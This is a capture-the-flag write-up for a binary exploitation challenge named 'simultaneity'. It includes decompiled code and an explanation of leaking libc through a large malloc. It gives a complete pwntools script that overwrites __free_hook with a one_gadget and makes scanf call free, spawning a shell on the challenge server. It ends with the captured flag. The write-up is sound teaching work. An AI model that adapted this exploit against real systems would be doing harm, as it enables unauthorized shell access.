# simultaneity

## Challenge

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Disassembly

```c
void main(void)
{
    void *pvVar1;
    undefined8 extraout_RDX;
    int64_t iVar2;
    uint64_t uVar3;
    int64_t in_FS_OFFSET;
    int64_t size;
    void *var_10h;
    int64_t var_8h;

    var_8h = *(int64_t *)(in_FS_OFFSET + 0x28);
    sym.imp.setvbuf(_reloc.stdout, 0, 2, 0);
    sym.imp.puts("how big?");
    sym.imp.__isoc99_scanf(0x200d, &size);
    var_10h = (void *)sym.imp.malloc(size);
    sym.imp.printf("you are here: %p\n", var_10h);
    sym.imp.puts("how far?");
    sym.imp.__isoc99_scanf(0x200d, &size);
    sym.imp.puts("what?");
    pvVar1 = (void *)((int64_t)var_10h + size * 8);
    sym.imp.__isoc99_scanf(0x2032, pvVar1, size * 8);
    uVar3 = 0;
    sym.imp._exit(0);
}
```

## Solution

The program accepts a size to malloc.

Once the space is allocated, the program prints the address to stdout, then asks for an offset and a qword to write to the address.

PIE is enabled, so we do not know the address of the binary.
However, we can find the address of libc by allocating enough space that a new page is created.
The page will be created directly above libc.
Knowing the size of this page, as well as the address given by the program, we can calculate the base address of libc.

There are no bounds on the offset, so we can now write a single qword to any location in libc.
By writing the address of a one_gadget to `__free_hook`, we can spawn a shell when `free` is called.
However, the `scanf` call that writes data is the last thing called before the program exits.

With a sufficiently large payload, `scanf` uses malloc and free in its implementation.
Thus, by padding the beginning of our content with zeros, we can force `scanf` to call `free` and spawn a shell.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mc.ax --port 31547 simultaneity
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('simultaneity')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 31547)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

howbig = 0x10000000
one_gadget = 0xe5456

io.recvuntil("how big?\n")
io.sendline(str(howbig - 0x18))
io.recvuntil("you are here: ")

leak = int(io.recvuntil("\n", drop=True), 0)

libc.address = leak + howbig - 0x10
io.success(hex(libc.address))

io.recvuntil("how far?\n")
io.sendline(str((libc.sym["__free_hook"] - leak) // 8))

io.recvuntil("what?\n")
io.sendline("0"*int(1e5) + str(libc.address + one_gadget))

io.interactive()
```

## Flag

`flag{sc4nf_i3_4_h34p_ch4l13ng3_TKRs8b1DRlN1hoLJ}`

